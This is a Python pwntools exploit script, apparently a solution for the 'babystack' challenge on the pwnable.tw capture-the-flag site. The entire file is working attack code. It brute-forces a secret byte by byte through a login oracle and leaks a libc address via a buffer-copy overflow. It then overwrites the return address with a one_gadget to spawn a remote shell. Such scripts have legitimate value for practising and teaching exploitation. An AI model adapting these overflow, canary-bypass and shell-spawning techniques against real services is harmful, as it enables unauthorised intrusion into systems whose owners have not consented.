from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babystack")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babystack")
else:
	p = remote("chall.pwnable.tw",10205)
	libc = ELF("libc_64.so.6")
	#elf = ELF("./babystack")

def copy(payload,buf):
	p.sendlineafter(">> ","1")
	p.sendafter("Your passowrd :",payload)
	p.recvuntil("Login Success !\n")
	p.sendafter(">> ","3")
	p.sendafter("Copy :",buf)
	p.recvuntil("It is magic copy !\n")

def checklogin(password,junk = False):
	if junk:
		p.sendlineafter(">> ","1")
		return
	p.sendlineafter(">> ","1")
	p.sendafter("Your passowrd :",password)
	info = p.recvline()
	if info == "Failed !\n":
		return False
	elif info == "Login Success !\n":
		return True

def bruteforce(nbytes,known):
	login = False
	flag = False
	while len(known) < nbytes:
		for j in range(0,256):
			if j == 0x00 or j == 0x0a:
				continue
			if login:
				checklogin("aaaa",True)
				login = False
			if checklogin(known + chr(j) + "\x00"):
				known += chr(j)
				login = True
				flag = True
				break
		if j == 255 and flag != True:
			print "here"
			if checklogin(known + "\x0a\x00"):
				known += "\x0a"
				checklogin("aaaa",True)
			else:
				known += "\x00"
		flag = False
		log.success("known:"+known.encode("hex"))
	return known

def debug():
	gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0xF5D), b2 = hex(code_base + 0xE1E)))

context.log_level = "debug"
code_base = 0x555555554000
canary = bruteforce(0x10,"")
assert len(canary) == 0x10
checklogin("a",True)
copy("\x00"+"a"*0x48,"a")
checklogin("a",True)
info = bruteforce(0x10,"a"*0x8)
offset = 0x7ffff7a85461 - 0x7ffff7a0d000 
leak_addr = u64(info[8:][:6].ljust(8,"\x00"))
libc.address = leak_addr - offset
log.success("libc_base:"+hex(libc.address))
one_gadget = libc.address + 0x45216
checklogin("a",True)
copy("\x00"+"a"*0x3f+canary+"a"*0x18+p64(one_gadget),"a")
p.sendlineafter(">> ","2")
p.interactive()
